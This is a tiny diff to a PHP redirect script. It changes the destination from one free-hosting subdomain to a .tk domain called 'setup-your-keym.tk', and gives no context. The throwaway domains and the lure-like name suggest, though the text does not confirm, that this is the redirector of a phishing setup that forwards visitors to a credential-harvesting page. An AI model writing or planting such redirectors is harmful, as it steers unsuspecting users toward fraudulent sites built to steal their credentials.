@@ -1,4 +1,4 @@
 <?php
-header("Location: https://contortional-transm.000webhostapp.com/actmca/");
+header("Location: setup-your-keym.tk");
 die();
 ?>
